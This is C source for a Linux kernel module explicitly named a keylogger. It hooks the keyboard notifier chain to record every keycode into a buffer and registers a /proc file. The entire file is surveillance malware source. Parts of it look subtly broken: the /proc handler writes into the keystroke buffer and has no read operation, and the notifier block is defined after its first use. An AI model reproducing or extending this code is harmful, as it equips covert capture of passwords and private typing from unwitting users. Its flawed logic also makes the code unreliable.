#include "keylogger.h"

static int keylogger_proc_open(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t keylogger_proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *offset) {
    if (count > sizeof(keys_buffer) - keys_buffer_pos)
        return -ENOMEM;
    
    if (copy_from_user(keys_buffer + keys_buffer_pos, buffer, count))
        return -EFAULT;
    
    keys_buffer_pos += count;
    return count;
}

static const struct file_operations keylogger_proc_fops = {
    .owner = THIS_MODULE,
    .open = keylogger_proc_open,
    .write = keylogger_proc_write,
};

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    
    if (code == KBD_KEYCODE) {
        if (keys_buffer_pos < sizeof(keys_buffer)) {
            keys_buffer[keys_buffer_pos++] = param->value;
        }
    }
    
    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    keys_buffer_pos = 0;
    register_keyboard_notifier(&keylogger_nb);
    
    proc_entry = proc_create(PROC_FILE_NAME, 0644, NULL, &keylogger_proc_fops);
    if (!proc_entry) {
        unregister_keyboard_notifier(&keylogger_nb);
        printk(KERN_ERR "Failed to create proc entry\n");
        return -ENOMEM;
    }
    
    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(PROC_FILE_NAME, NULL);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};
